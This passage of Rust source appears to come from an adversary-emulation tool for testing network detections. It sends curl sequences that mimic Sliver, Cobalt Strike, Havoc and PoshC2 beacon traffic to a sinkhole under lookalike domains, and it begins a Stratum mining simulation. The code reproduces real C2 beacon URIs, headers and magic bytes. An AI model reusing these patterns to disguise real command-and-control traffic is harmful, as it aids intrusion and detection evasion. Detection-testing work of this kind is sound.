                                let ec = output.status.code().unwrap_or(-1);
                                let cert_line = stdout
                                    .lines()
                                    .find(|l| {
                                        l.contains("subject")
                                            || l.contains("CN=")
                                            || l.contains("issuer")
                                    })
                                    .unwrap_or("(no cert info)");
                                if ec == 0
                                    || stdout.contains("CONNECTION ESTABLISHED")
                                {
                                    println!("CONNECTED");
                                    writeln!(
                                        log,
                                        "PoshC2 TLS: CONNECTED ({})",
                                        cert_line.trim()
                                    )
                                    .unwrap();
                                    info!(
                                        "[T1071-IOC-HTTP] PoshC2 TLS connected \
                                         to {}: {}",
                                        poshc2_tls_addr,
                                        cert_line.trim()
                                    );
                                } else {
                                    println!("ATTEMPTED (ec={})", ec);
                                    writeln!(
                                        log,
                                        "PoshC2 TLS: ATTEMPTED (ec={}, {})",
                                        ec,
                                        cert_line.trim()
                                    )
                                    .unwrap();
                                    info!(
                                        "[T1071-IOC-HTTP] PoshC2 TLS attempted \
                                         {}: ec={}",
                                        poshc2_tls_addr,
                                        ec
                                    );
                                }
                            }
                            Ok(Err(e)) => {
                                println!("ERROR ({})", e);
                                writeln!(log, "PoshC2 TLS: ERROR ({})", e)
                                    .unwrap();
                                debug!(
                                    "[T1071-IOC-HTTP] PoshC2 TLS error at {}: \
                                     {} (openssl not installed?)",
                                    poshc2_tls_addr, e
                                );
                            }
                            Err(_) => {
                                println!("TIMEOUT");
                                writeln!(log, "PoshC2 TLS: TIMEOUT").unwrap();
                                debug!(
                                    "[T1071-IOC-HTTP] PoshC2 TLS timeout at {}",
                                    poshc2_tls_addr
                                );
                            }
                        }
                        sleep(Duration::from_secs(2)).await;
                    } else if profile.domain == "signalbench-rat.xyz" {
                        println!(
                            "[T1071-IOC-HTTP]   Framework: {} (19-request Sliver session)",
                            profile.framework
                        );
                        writeln!(
                            log,
                            "Mode: Sliver 19-request session (port 4444)"
                        )
                        .unwrap();
                        let sliver_sessid =
                            Uuid::new_v4().to_string().replace('-', "");
                        let sliver_host = format!("Host: {}", profile.domain);
                        let sliver_base =
                            format!("http://{}:4444", sinkhole_ip);
                        type SliverReq = (
                            &'static str,
                            &'static str,
                            bool,
                            bool,
                            &'static str,
                        );
                        let sliver_reqs: &[SliverReq] = &[
                            ("GET",  "/static/robots.txt",     false, true,  "sid:57675"),
                            ("GET",  "/www/info.txt",          false, true,  "sid:57676"),
                            ("GET",  "/docs/sample.txt",       false, true,  "sid:57682"),
                            ("POST", "/app/login.jsp",         false, true,  "sid:57677"),
                            ("POST", "/wordpress/login.php",   true,  true,  "sid:57678"),
                            ("POST", "/api/api.php",           true,  true,  "sid:57679"),
                            ("POST", "/rest/samples.php",      true,  true,  "sid:57680"),
                            ("GET",  "/js/jquery.min.js",      true,  true,  "sid:57681"),
                            ("GET",  "/fonts/glyphicons.woff", false, true,  "stager-woff"),
                            ("GET",  "/static/keys.html",      false, true,  "keyexch-html"),
                            ("GET",  "/img/spacer.png",        true,  true,  "close-png"),
                            ("GET",  "/robots.txt",            false, false, "razy-hex"),
                            ("GET",  "/info.txt",              false, false, "razy-hex"),
                            ("GET",  "/sample.txt",            false, false, "razy-hex"),
                            ("POST", "/wp/n.jsp",              false, false, "razy-hex"),
                            ("POST", "/wp/in.php",             true,  false, "razy-hex"),
                            ("POST", "/api.php",               true,  false, "razy-hex"),
                            ("POST", "/wp/samples.php",        true,  false, "razy-hex"),
                            ("GET",  "/js/app.min.js",         true,  false, "razy-hex"),
                        ];
                        let sliver_total = sliver_reqs.len();
                        let mut sliver_any_ok = false;
                        for (ri, &(method, path, with_sess, is_numeric, sid))
                            in sliver_reqs.iter().enumerate()
                        {
                            let nonce = if is_numeric {
                                use rand::Rng;
                                rand::rng()
                                    .random_range(1u32..=999_999_999)
                                    .to_string()
                            } else {
                                Uuid::new_v4()
                                    .to_string()
                                    .replace('-', "")[..16]
                                    .to_string()
                            };
                            let uri = format!(
                                "{}{}?_={}",
                                sliver_base, path, nonce
                            );
                            let mut sl_args: Vec<String> = vec![
                                "-s".to_string(),
                                "-o".to_string(),
                                "/dev/null".to_string(),
                                "-w".to_string(),
                                "%{http_code},%{time_total},%{remote_ip}".to_string(),
                                "--max-time".to_string(),
                                timeout.to_string(),
                                "--connect-timeout".to_string(),
                                timeout.to_string(),
                                "-X".to_string(),
                                method.to_string(),
                                "-A".to_string(),
                                profile.user_agent.to_string(),
                                "-H".to_string(),
                                sliver_host.clone(),
                                "-H".to_string(),
                                "Accept-Language: en-US".to_string(),
                            ];
                            if with_sess {
                                sl_args.push("-H".to_string());
                                sl_args.push(format!(
                                    "Cookie: PHPSESSID={}",
                                    sliver_sessid
                                ));
                            }
                            sl_args.push(uri);
                            writeln!(
                                log,
                                "Sliver req {}/{} [{}]: {} {}",
                                ri + 1, sliver_total, sid, method, path
                            )
                            .unwrap();
                            match Command::new("curl").args(&sl_args).output().await {
                                Ok(output) => {
                                    let res =
                                        String::from_utf8_lossy(&output.stdout);
                                    let ec = output.status.code().unwrap_or(-1);
                                    if is_fallback {
                                        writeln!(
                                            log,
                                            "Sliver {}/{} [{}]: SENT (fallback)",
                                            ri + 1, sliver_total, sid
                                        )
                                        .unwrap();
                                    } else if ec == 0 {
                                        if !sliver_any_ok {
                                            successful_connections += 1;
                                            sliver_any_ok = true;
                                        }
                                        writeln!(
                                            log,
                                            "Sliver {}/{} [{}]: SUCCESS ({})",
                                            ri + 1, sliver_total, sid, res.trim()
                                        )
                                        .unwrap();
                                    } else {
                                        writeln!(
                                            log,
                                            "Sliver {}/{} [{}]: FAILED (ec={})",
                                            ri + 1, sliver_total, sid, ec
                                        )
                                        .unwrap();
                                    }
                                }
                                Err(e) => {
                                    writeln!(
                                        log,
                                        "Sliver {}/{} [{}]: ERROR ({})",
                                        ri + 1, sliver_total, sid, e
                                    )
                                    .unwrap();
                                }
                            }
                        }
                        if is_fallback {
                            println!(
                                "  [-->] Sliver {}-request sequence sent (fallback)",
                                sliver_total
                            );
                        } else if sliver_any_ok {
                            println!(
                                "  [OK] Sliver {}-request sequence complete",
                                sliver_total
                            );
                        } else {
                            println!(
                                "  [--] Sliver {}-request sequence failed",
                                sliver_total
                            );
                        }
                        sleep(Duration::from_secs(2)).await;
                    } else if profile.domain == "signalbench-malware.ru" {
                        println!(
                            "[T1071-IOC-HTTP]   Framework: {} (6-pattern CS sequence)",
                            profile.framework
                        );
                        writeln!(
                            log,
                            "Mode: Cobalt Strike 6-pattern sequence (port 4444)"
                        )
                        .unwrap();
                        let cs_base = format!("http://{}:4444", sinkhole_ip);
                        let cs_host = format!("Host: {}", profile.domain);
                        let cs_uuid = Uuid::new_v4().to_string();
                        let cs_b64_data = B64.encode(cs_uuid.as_bytes());
                        let mut cs_any_ok = false;
                        macro_rules! cs_curl {
                            ($args:expr, $label:expr) => {{
                                writeln!(
                                    log,
                                    "CS {}: curl {}",
                                    $label,
                                    $args.join(" ")
                                )
                                .unwrap();
                                match Command::new("curl").args(&$args).output().await {
                                    Ok(output) => {
                                        let res =
                                            String::from_utf8_lossy(&output.stdout);
                                        let ec =
                                            output.status.code().unwrap_or(-1);
                                        if is_fallback {
                                            writeln!(
                                                log,
                                                "CS {}: SENT (fallback)",
                                                $label
                                            )
                                            .unwrap();
                                        } else if ec == 0 {
                                            if !cs_any_ok {
                                                successful_connections += 1;
                                                cs_any_ok = true;
                                            }
                                            writeln!(
                                                log,
                                                "CS {}: SUCCESS ({})",
                                                $label,
                                                res.trim()
                                            )
                                            .unwrap();
                                        } else {
                                            writeln!(
                                                log,
                                                "CS {}: FAILED (ec={})",
                                                $label,
                                                ec
                                            )
                                            .unwrap();
                                        }
                                    }
                                    Err(e) => {
                                        writeln!(
                                            log,
                                            "CS {}: ERROR ({})",
                                            $label,
                                            e
                                        )
                                        .unwrap();
                                    }
                                }
                            }};
                        }
                        let cs1_args: Vec<String> = vec![
                            "-s".to_string(), "-o".to_string(), "/dev/null".to_string(),
                            "-w".to_string(), "%{http_code},%{time_total}".to_string(),
                            "--max-time".to_string(), timeout.to_string(),
                            "--connect-timeout".to_string(), timeout.to_string(),
                            "-X".to_string(), "GET".to_string(),
                            "-A".to_string(), profile.user_agent.to_string(),
                            "-H".to_string(), cs_host.clone(),
                            "-H".to_string(),
                            "Cookie: auth_tokenAB01=ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEF"
                                .to_string(),
                            format!("{}/get", cs_base),
                        ];
                        cs_curl!(cs1_args, "sid63772");
                        let cs2_args: Vec<String> = vec![
                            "-s".to_string(), "-o".to_string(), "/dev/null".to_string(),
                            "-w".to_string(), "%{http_code},%{time_total}".to_string(),
                            "--max-time".to_string(), timeout.to_string(),
                            "--connect-timeout".to_string(), timeout.to_string(),
                            "-X".to_string(), "GET".to_string(),
                            "-A".to_string(),
                            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) \
                             AppleWebKit/537.36 (KHTML, like Gecko) \
                             Chrome/88.0.4324.104 Safari/537.36".to_string(),
                            "-H".to_string(), cs_host.clone(),
                            "-H".to_string(), "Accept-Encoding:".to_string(),
                            "-H".to_string(), "Accept-Language:".to_string(),
                            format!("{}/oscp/beacon", cs_base),
                        ];
                        cs_curl!(cs2_args, "sid65446");
                        let cs_submit_body: Vec<u8> = vec![
                            0x04, 0x00, 0x00, 0x00, 0x41, 0x41, 0x41, 0x41,
                        ];
                        if let Some((args, _tf)) = tempfile::NamedTempFile::new()
                            .ok()
                            .and_then(|mut tf| {
                                if tf.write_all(&cs_submit_body).is_ok() {
                                    let p = tf.path().to_string_lossy().to_string();
                                    let args: Vec<String> = vec![
                                        "-s".to_string(), "-o".to_string(),
                                        "/dev/null".to_string(),
                                        "-w".to_string(),
                                        "%{http_code},%{time_total}".to_string(),
                                        "--max-time".to_string(), timeout.to_string(),
                                        "--connect-timeout".to_string(),
                                        timeout.to_string(),
                                        "-X".to_string(), "POST".to_string(),
                                        "-A".to_string(),
                                        profile.user_agent.to_string(),
                                        "-H".to_string(), cs_host.clone(),
                                        "-H".to_string(),
                                        "Content-Type: application/octet-stream"
                                            .to_string(),
                                        "-d".to_string(), format!("@{}", p),
                                        format!("{}/submit.php?id=1", cs_base),
                                    ];
                                    Some((args, tf))
                                } else {
                                    None
                                }
                            })
                        {
                            cs_curl!(args, "sid300048");
                        }
                        let cs4_args: Vec<String> = vec![
                            "-s".to_string(), "-o".to_string(), "/dev/null".to_string(),
                            "-w".to_string(), "%{http_code},%{time_total}".to_string(),
                            "--max-time".to_string(), timeout.to_string(),
                            "--connect-timeout".to_string(), timeout.to_string(),
                            "-X".to_string(), "GET".to_string(),
                            "-A".to_string(), profile.user_agent.to_string(),
                            "-H".to_string(), cs_host.clone(),
                            format!("{}/mPlayer", cs_base),
                        ];
                        cs_curl!(cs4_args, "sid54175");
                        let cs5_get_args: Vec<String> = vec![
                            "-s".to_string(), "-o".to_string(), "/dev/null".to_string(),
                            "-w".to_string(), "%{http_code},%{time_total}".to_string(),
                            "--max-time".to_string(), timeout.to_string(),
                            "--connect-timeout".to_string(), timeout.to_string(),
                            "-X".to_string(), "GET".to_string(),
                            "-A".to_string(), profile.user_agent.to_string(),
                            "-H".to_string(), cs_host.clone(),
                            format!("{}/compatible?id={}", cs_base, cs_uuid),
                        ];
                        cs_curl!(cs5_get_args, "sid54182-GET");
                        let cs5_body =
                            format!("data={}&from=0", cs_b64_data).into_bytes();
                        if let Some((args, _tf)) = tempfile::NamedTempFile::new()
                            .ok()
                            .and_then(|mut tf| {
                                if tf.write_all(&cs5_body).is_ok() {
                                    let p = tf.path().to_string_lossy().to_string();
                                    let args: Vec<String> = vec![
                                        "-s".to_string(), "-o".to_string(),
                                        "/dev/null".to_string(),
                                        "-w".to_string(),
                                        "%{http_code},%{time_total}".to_string(),
                                        "--max-time".to_string(), timeout.to_string(),
                                        "--connect-timeout".to_string(),
                                        timeout.to_string(),
                                        "-X".to_string(), "POST".to_string(),
                                        "-A".to_string(),
                                        profile.user_agent.to_string(),
                                        "-H".to_string(), cs_host.clone(),
                                        "-d".to_string(), format!("@{}", p),
                                        format!(
                                            "{}/compatible?id={}",
                                            cs_base, cs_uuid
                                        ),
                                    ];
                                    Some((args, tf))
                                } else {
                                    None
                                }
                            })
                        {
                            cs_curl!(args, "sid54182-POST");
                        }
                        let cs6_body = format!(
                            "{{\"locale\":\"en\",\"channel\":\"prod\",\
                              \"addon\":\"{}\",\"cli\":\"x\",\"l-monitor\":\"y\"}}",
                            cs_uuid
                        )
                        .into_bytes();
                        if let Some((args, _tf)) = tempfile::NamedTempFile::new()
                            .ok()
                            .and_then(|mut tf| {
                                if tf.write_all(&cs6_body).is_ok() {
                                    let p = tf.path().to_string_lossy().to_string();
                                    let args: Vec<String> = vec![
                                        "-s".to_string(), "-o".to_string(),
                                        "/dev/null".to_string(),
                                        "-w".to_string(),
                                        "%{http_code},%{time_total}".to_string(),
                                        "--max-time".to_string(), timeout.to_string(),
                                        "--connect-timeout".to_string(),
                                        timeout.to_string(),
                                        "-X".to_string(), "POST".to_string(),
                                        "-A".to_string(),
                                        profile.user_agent.to_string(),
                                        "-H".to_string(), cs_host.clone(),
                                        "-H".to_string(),
                                        "Content-Type: application/json".to_string(),
                                        "-d".to_string(), format!("@{}", p),
                                        format!("{}/track", cs_base),
                                    ];
                                    Some((args, tf))
                                } else {
                                    None
                                }
                            })
                        {
                            cs_curl!(args, "sid56616");
                        }
                        if is_fallback {
                            println!(
                                "  [-->] Cobalt Strike 6-pattern sequence sent (fallback)"
                            );
                        } else if cs_any_ok {
                            println!(
                                "  [OK] Cobalt Strike 6-pattern sequence complete"
                            );
                        } else {
                            println!(
                                "  [--] Cobalt Strike 6-pattern sequence failed"
                            );
                        }
                        sleep(Duration::from_secs(2)).await;
                    } else if profile.domain == "signalbench-havoc.cc" {
                        println!(
                            "[T1071-IOC-HTTP]   Framework: {} (3-request Havoc sequence)",
                            profile.framework
                        );
                        writeln!(
                            log,
                            "Mode: Havoc 3-request sequence (port 4444)"
                        )
                        .unwrap();
                        let havoc_base = format!("http://{}:4444", sinkhole_ip);
                        let havoc_host = format!("Host: {}", profile.domain);
                        let havoc_rand =
                            Uuid::new_v4().to_string().replace('-', "");
                        let mut havoc_any_ok = false;
                        let hav1_args: Vec<String> = vec![
                            "-s".to_string(), "-o".to_string(), "/dev/null".to_string(),
                            "-w".to_string(), "%{http_code},%{time_total}".to_string(),
                            "--max-time".to_string(), timeout.to_string(),
                            "--connect-timeout".to_string(), timeout.to_string(),
                            "-X".to_string(), "GET".to_string(),
                            "-A".to_string(), profile.user_agent.to_string(),
                            "-H".to_string(), havoc_host.clone(),
                            "-H".to_string(), "Server: Apache".to_string(),
                            format!(
                                "{}/js/jquery-3.6.4.min.js?id={}&hash={}",
                                havoc_base,
                                &havoc_rand[..8],
                                &havoc_rand[8..16]
                            ),
                        ];
                        writeln!(log, "Havoc req 1/3: GET /js/jquery").unwrap();
                        match Command::new("curl").args(&hav1_args).output().await {
                            Ok(output) => {
                                let ec = output.status.code().unwrap_or(-1);
                                if is_fallback {
                                    writeln!(log, "Havoc 1/3: SENT (fallback)").unwrap();
                                } else if ec == 0 {
                                    if !havoc_any_ok {
                                        successful_connections += 1;
                                        havoc_any_ok = true;
                                    }
                                    writeln!(log, "Havoc 1/3: SUCCESS").unwrap();
                                } else {
                                    writeln!(
                                        log,
                                        "Havoc 1/3: FAILED (ec={})",
                                        ec
                                    )
                                    .unwrap();
                                }
                            }
                            Err(e) => {
                                writeln!(log, "Havoc 1/3: ERROR ({})", e).unwrap();
                            }
                        }
                        let havoc_body_deadbeef: Vec<u8> = vec![
                            0x00, 0x00, 0x00, 0x0C,
                            0xDE, 0xAD, 0xBE, 0xEF,
                            0x00, 0x00, 0x00, 0x20,
                            0x00, 0x00, 0x00, 0x01,
                        ];
                        let havoc_body_b16b00b5: Vec<u8> = vec![
                            0x00, 0x00, 0x00, 0x0C,
                            0xB1, 0x6B, 0x00, 0xB5,
                            0x00, 0x00, 0x00, 0x20,
                            0x00, 0x00, 0x00, 0x01,
                        ];
                        if let Ok(mut tf) = tempfile::NamedTempFile::new() {
                            if tf.write_all(&havoc_body_deadbeef).is_ok() {
                                let p = tf.path().to_string_lossy().to_string();
                                let hav2_args: Vec<String> = vec![
                                    "-s".to_string(), "-o".to_string(),
                                    "/dev/null".to_string(),
                                    "-w".to_string(),
                                    "%{http_code},%{time_total}".to_string(),
                                    "--max-time".to_string(), timeout.to_string(),
                                    "--connect-timeout".to_string(),
                                    timeout.to_string(),
                                    "-X".to_string(), "POST".to_string(),
                                    "-A".to_string(), profile.user_agent.to_string(),
                                    "-H".to_string(), havoc_host.clone(),
                                    "-H".to_string(),
                                    "Content-Type: application/octet-stream".to_string(),
                                    "-d".to_string(), format!("@{}", p),
                                    format!(
                                        "{}/Collectors/3.0/settings/mail/",
                                        havoc_base
                                    ),
                                ];
                                writeln!(
                                    log,
                                    "Havoc req 2/3: POST /Collectors/ (DEADBEEF)"
                                )
                                .unwrap();
                                match Command::new("curl")
                                    .args(&hav2_args)
                                    .output()
                                    .await
                                {
                                    Ok(output) => {
                                        let ec = output.status.code().unwrap_or(-1);
                                        if is_fallback {
                                            writeln!(
                                                log,
                                                "Havoc 2/3: SENT (fallback)"
                                            )
                                            .unwrap();
                                        } else if ec == 0 {
                                            if !havoc_any_ok {
                                                successful_connections += 1;
                                                havoc_any_ok = true;
                                            }
                                            writeln!(log, "Havoc 2/3: SUCCESS").unwrap();
                                        } else {
                                            writeln!(
                                                log,
                                                "Havoc 2/3: FAILED (ec={})",
                                                ec
                                            )
                                            .unwrap();
                                        }
                                    }
                                    Err(e) => {
                                        writeln!(log, "Havoc 2/3: ERROR ({})", e)
                                            .unwrap();
                                    }
                                }
                                drop(tf);
                            }
                        }
                        if let Ok(mut tf) = tempfile::NamedTempFile::new() {
                            if tf.write_all(&havoc_body_b16b00b5).is_ok() {
                                let p = tf.path().to_string_lossy().to_string();
                                let hav3_args: Vec<String> = vec![
                                    "-s".to_string(), "-o".to_string(),
                                    "/dev/null".to_string(),
                                    "-w".to_string(),
                                    "%{http_code},%{time_total}".to_string(),
                                    "--max-time".to_string(), timeout.to_string(),
                                    "--connect-timeout".to_string(),
                                    timeout.to_string(),
                                    "-X".to_string(), "POST".to_string(),
                                    "-A".to_string(), profile.user_agent.to_string(),
                                    "-H".to_string(), havoc_host.clone(),
                                    "-H".to_string(),
                                    "Content-Type: application/octet-stream".to_string(),
                                    "-d".to_string(), format!("@{}", p),
                                    format!(
                                        "{}/Collectors/3.0/events/mail/",
                                        havoc_base
                                    ),
                                ];
                                writeln!(
                                    log,
                                    "Havoc req 3/3: POST /Collectors/ (B16B00B5)"
                                )
                                .unwrap();
                                match Command::new("curl")
                                    .args(&hav3_args)
                                    .output()
                                    .await
                                {
                                    Ok(output) => {
                                        let ec = output.status.code().unwrap_or(-1);
                                        if is_fallback {
                                            writeln!(
                                                log,
                                                "Havoc 3/3: SENT (fallback)"
                                            )
                                            .unwrap();
                                        } else if ec == 0 {
                                            if !havoc_any_ok {
                                                successful_connections += 1;
                                                havoc_any_ok = true;
                                            }
                                            writeln!(log, "Havoc 3/3: SUCCESS").unwrap();
                                        } else {
                                            writeln!(
                                                log,
                                                "Havoc 3/3: FAILED (ec={})",
                                                ec
                                            )
                                            .unwrap();
                                        }
                                    }
                                    Err(e) => {
                                        writeln!(log, "Havoc 3/3: ERROR ({})", e)
                                            .unwrap();
                                    }
                                }
                                drop(tf);
                            }
                        }
                        if is_fallback {
                            println!(
                                "  [-->] Havoc 3-request sequence sent (fallback)"
                            );
                        } else if havoc_any_ok {
                            println!("  [OK] Havoc 3-request sequence complete");
                        } else {
                            println!("  [--] Havoc 3-request sequence failed");
                        }
                        sleep(Duration::from_secs(2)).await;
                    } else {
                        // Standard C2 framework profile (AdaptixC2, Empire, Mythic, etc.)
                        println!(
                            "[T1071-IOC-HTTP]   Framework: {} (C2 profile, port 4444)",
                            profile.framework
                        );
                        writeln!(
                            log,
                            "Mode: C2 profile (port 4444 primary, port 80 follow-up)"
                        )
                        .unwrap();
                        let primary_url = format!(
                            "http://{}:4444{}",
                            sinkhole_ip, profile.uri
                        );
                        let mut primary_args: Vec<String> = vec![
                            "-s".to_string(),
                            "-o".to_string(),
                            "/dev/null".to_string(),
                            "-w".to_string(),
                            "%{http_code},%{time_total},%{remote_ip}".to_string(),
                            "--max-time".to_string(),
                            timeout.to_string(),
                            "--connect-timeout".to_string(),
                            timeout.to_string(),
                            "-A".to_string(),
                            profile.user_agent.to_string(),
                            "-X".to_string(),
                            profile.method.to_string(),
                            "-H".to_string(),
                            format!("Host: {}", profile.domain),
                        ];
                        for hdr in &profile.extra_headers {
                            primary_args.push("-H".to_string());
                            primary_args.push(hdr.clone());
                        }
                        let primary_body_tf: Option<tempfile::NamedTempFile>;
                        if let Some(body_bytes) = &profile.body {
                            match tempfile::NamedTempFile::new() {
                                Ok(mut tf) => {
                                    if tf.write_all(body_bytes).is_ok() {
                                        let path =
                                            tf.path().to_string_lossy().to_string();
                                        primary_args.push("-d".to_string());
                                        primary_args
                                            .push(format!("@{}", path));
                                        primary_body_tf = Some(tf);
                                    } else {
                                        primary_body_tf = None;
                                    }
                                }
                                Err(_) => {
                                    primary_body_tf = None;
                                }
                            }
                        } else {
                            primary_body_tf = None;
                        }
                        primary_args.push(primary_url);
                        writeln!(
                            log,
                            "Primary curl: curl {}",
                            primary_args.join(" ")
                        )
                        .unwrap();
                        match Command::new("curl").args(&primary_args).output().await {
                            Ok(output) => {
                                let result =
                                    String::from_utf8_lossy(&output.stdout);
                                let exit_code =
                                    output.status.code().unwrap_or(-1);
                                if is_fallback {
                                    println!("  [-->] Sent (fallback unidirectional)");
                                    writeln!(
                                        log,
                                        "Primary status: SENT (fallback)"
                                    )
                                    .unwrap();
                                } else if exit_code == 0 {
                                    successful_connections += 1;
                                    println!(
                                        "  [OK] Response: {}",
                                        result.trim()
                                    );
                                    writeln!(log, "Primary status: SUCCESS").unwrap();
                                } else {
                                    println!(
                                        "  [--] Failed (exit code: {})",
                                        exit_code
                                    );
                                    writeln!(
                                        log,
                                        "Primary status: FAILED (ec={})",
                                        exit_code
                                    )
                                    .unwrap();
                                }
                            }
                            Err(e) => {
                                println!("  [FAIL] Error: {}", e);
                                writeln!(log, "Primary status: ERROR ({})", e).unwrap();
                            }
                        }
                        drop(primary_body_tf);
                        if let (Some(followup_uri), Some(followup_method)) =
                            (&profile.followup_uri, profile.followup_method)
                        {
                            let followup_url = format!(
                                "http://{}:80{}",
                                sinkhole_ip, followup_uri
                            );
                            let mut followup_args: Vec<String> = vec![
                                "-s".to_string(),
                                "-o".to_string(),
                                "/dev/null".to_string(),
                                "-w".to_string(),
                                "%{http_code},%{time_total},%{remote_ip}".to_string(),
                                "--max-time".to_string(),
                                timeout.to_string(),
                                "--connect-timeout".to_string(),
                                timeout.to_string(),
                                "-A".to_string(),
                                profile.user_agent.to_string(),
                                "-X".to_string(),
                                followup_method.to_string(),
                                "-H".to_string(),
                                format!("Host: {}", profile.domain),
                            ];
                            for hdr in &profile.followup_extra_headers {
                                followup_args.push("-H".to_string());
                                followup_args.push(hdr.clone());
                            }
                            let followup_body_tf: Option<tempfile::NamedTempFile>;
                            if let Some(body_bytes) = &profile.followup_body {
                                match tempfile::NamedTempFile::new() {
                                    Ok(mut tf) => {
                                        if tf.write_all(body_bytes).is_ok() {
                                            let path =
                                                tf.path().to_string_lossy().to_string();
                                            followup_args.push("-d".to_string());
                                            followup_args
                                                .push(format!("@{}", path));
                                            followup_body_tf = Some(tf);
                                        } else {
                                            followup_body_tf = None;
                                        }
                                    }
                                    Err(_) => {
                                        followup_body_tf = None;
                                    }
                                }
                            } else {
                                followup_body_tf = None;
                            }
                            followup_args.push(followup_url);
                            writeln!(
                                log,
                                "Follow-up curl: curl {}",
                                followup_args.join(" ")
                            )
                            .unwrap();
                            match Command::new("curl")
                                .args(&followup_args)
                                .output()
                                .await
                            {
                                Ok(output) => {
                                    let exit_code =
                                        output.status.code().unwrap_or(-1);
                                    if is_fallback {
                                        writeln!(
                                            log,
                                            "Follow-up status: SENT (fallback)"
                                        )
                                        .unwrap();
                                    } else if exit_code == 0 {
                                        writeln!(
                                            log,
                                            "Follow-up status: SUCCESS"
                                        )
                                        .unwrap();
                                    } else {
                                        writeln!(
                                            log,
                                            "Follow-up status: FAILED (ec={})",
                                            exit_code
                                        )
                                        .unwrap();
                                    }
                                }
                                Err(e) => {
                                    writeln!(
                                        log,
                                        "Follow-up status: ERROR ({})",
                                        e
                                    )
                                    .unwrap();
                                }
                            }
                            drop(followup_body_tf);
                        }
                    }
                } else {
                    // Plain curl for DGA, IP, Tor-proxy, mining-pool domains without profile
                    let curl_result = Command::new("curl")
                        .args([
                            "-s", "-o", "/dev/null",
                            "-w", "%{http_code},%{time_total},%{remote_ip}",
                            "--max-time", &timeout.to_string(),
                            "--connect-timeout", &timeout.to_string(),
                            &format!("http://{}", domain),
                        ])
                        .output()
                        .await;
                    match curl_result {
                        Ok(output) => {
                            let result = String::from_utf8_lossy(&output.stdout);
                            let exit_code = output.status.code().unwrap_or(-1);
                            if exit_code == 0 {
                                successful_connections += 1;
                                println!("  [OK] Response: {}", result.trim());
                                writeln!(log, "Status: SUCCESS").unwrap();
                            } else {
                                println!(
                                    "  [--] Failed (exit code: {})",
                                    exit_code
                                );
                                writeln!(
                                    log,
                                    "Status: FAILED (ec={})",
                                    exit_code
                                )
                                .unwrap();
                            }
                        }
                        Err(e) => {
                            println!("  [FAIL] Error: {}", e);
                            writeln!(log, "Status: ERROR ({})", e).unwrap();
                        }
                    }
                }

                // DNS lookup for additional telemetry (all domains)
                if dig_available {
                    let dig_result = Command::new("dig")
                        .args(["+short", "+time=1", "+tries=1", domain])
                        .output()
                        .await;
                    if let Ok(output) = dig_result {
                        let dns_result = String::from_utf8_lossy(&output.stdout);
                        if !dns_result.trim().is_empty() {
                            writeln!(log, "DNS: {}", dns_result.trim()).unwrap();
                        } else {
                            writeln!(log, "DNS: No resolution").unwrap();
                        }
                    }
                } else {
                    match tokio::net::lookup_host(format!("{domain}:0")).await {
                        Ok(addrs) => {
                            let ips: Vec<String> =
                                addrs.map(|a| a.ip().to_string()).collect();
                            if ips.is_empty() {
                                writeln!(
                                    log,
                                    "DNS: No resolution (native resolver)"
                                )
                                .unwrap();
                            } else {
                                writeln!(
                                    log,
                                    "DNS: {} (native resolver)",
                                    ips.join(" ")
                                )
                                .unwrap();
                            }
                        }
                        Err(e) => {
                            writeln!(
                                log,
                                "DNS: lookup failed (native resolver): {e}"
                            )
                            .unwrap();
                        }
                    }
                }
                writeln!(log).unwrap();
            }

            print_skipped_domains_warning(&skipped_domains, &sinkhole_ip);

            println!("\n{}", "-".repeat(60));
            println!(
                "[T1071-IOC-HTTP] Summary: {} domain connections ({} ok, {} failed, {} skipped)",
                connection_count,
                successful_connections,
                connection_count - successful_connections,
                skipped_count
            );
            println!("{}", "-".repeat(60));

            info!(
                "[T1071-IOC-HTTP] Complete: {} connections ({} ok, {} skipped)",
                connection_count, successful_connections, skipped_count
            );

            let mut artifacts = vec![log_file.clone()];
            if hosts_modified {
                artifacts.push(HOSTS_ARTIFACT_MARKER.to_string());
            }

            Ok(SimulationResult {
                technique_id: "T1071-IOC-HTTP".to_string(),
                success: true,
                message: format!(
                    "HTTP C2 framework profiling: {} domain connections ({} ok, {} failed, {} skipped)",
                    connection_count,
                    successful_connections,
                    connection_count - successful_connections,
                    skipped_count
                ),
                artifacts,
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            debug!("[T1071-IOC-HTTP] Starting cleanup");
            if artifacts.contains(&HOSTS_ARTIFACT_MARKER.to_string()) {
                if is_running_as_root() {
                    match remove_hosts_entries() {
                        Ok(()) => {
                            info!("[T1071-IOC-HTTP] Cleaned up /etc/hosts entries");
                        }
                        Err(e) => {
                            warn!(
                                "[T1071-IOC-HTTP] Failed to clean up /etc/hosts: {}",
                                e
                            );
                        }
                    }
                } else {
                    warn!(
                        "[T1071-IOC-HTTP] Cannot clean up /etc/hosts without root privileges"
                    );
                    warn!(
                        "[T1071-IOC-HTTP] Manually remove entries between {} and {}",
                        HOSTS_MARKER_START, HOSTS_MARKER_END
                    );
                }
            }
            for artifact in artifacts {
                if Path::new(artifact).exists() {
                    if let Err(e) = fs::remove_file(artifact) {
                        warn!(
                            "[T1071-IOC-HTTP] Failed to remove {}: {}",
                            artifact, e
                        );
                    } else {
                        debug!("[T1071-IOC-HTTP] Removed: {}", artifact);
                    }
                }
            }
            info!("[T1071-IOC-HTTP] Cleanup complete");
            Ok(())
        })
    }
}

pub struct SuspiciousDomainsStratum {}

#[async_trait]
impl AttackTechnique for SuspiciousDomainsStratum {
    fn info(&self) -> Technique {
        Technique {
            id: "T1071-IOC-STRATUM".to_string(),
            name: "Suspicious Domain Connections - Stratum Mining Protocol Simulation".to_string(),
            description: "Simulates Stratum v1 cryptocurrency mining sessions to trigger \
                mining-pool network detections. Connects to signalbench-controlled mining-pool \
                hostnames on ports 3333 and 4444, sending the full Stratum JSON-RPC handshake: \
                mining.subscribe -> set_difficulty + mining.notify -> mining.authorize -> \
                set_difficulty + mining.notify + client.get_version -> 4x mining.submit + \
                mining.notify (1s inter-round sleep) -> mining.ping/pong -> top-up sleep to reach \
                >=5s total dwell. The >=5s bidirectional session causes Palo Alto PA-440 App-ID \
                to classify traffic as stratum-mining."
                .to_string(),
            category: "COMMAND_AND_CONTROL".to_string(),
            parameters: vec![TechniqueParameter {
                name: "log_file".to_string(),
                description: "Path to save session log".to_string(),
                required: false,
                default: Some("/tmp/signalbench_t1071_stratum.log".to_string()),
            }],
